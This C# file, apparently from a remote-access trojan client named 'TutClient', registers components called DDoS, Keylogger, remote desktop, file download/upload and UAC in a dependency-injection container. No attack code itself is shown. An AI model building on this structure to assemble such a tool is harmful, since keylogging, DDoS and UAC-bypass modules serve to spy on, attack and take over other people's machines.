using TutClient.Controls;

using Unity;
using Unity.Extension;
using Unity.Lifetime;

namespace TutClient.Bootstrapper
{
    public class ControlsUnityContainer : UnityContainerExtension
    {
        protected override void Initialize()
        {
            Container.RegisterType<IDDoS, DDoS>(new ContainerControlledLifetimeManager());
            Container.RegisterType<IDownloadUpload, DownloadUpload>(new ContainerControlledLifetimeManager());
            Container.RegisterType<IKeylogger, Keylogger>(new ContainerControlledLifetimeManager());
            Container.RegisterType<IRDesktop, RDesktop>(new ContainerControlledLifetimeManager());
            Container.RegisterType<IUAC, UAC>(new ContainerControlledLifetimeManager());
        }
    }
}
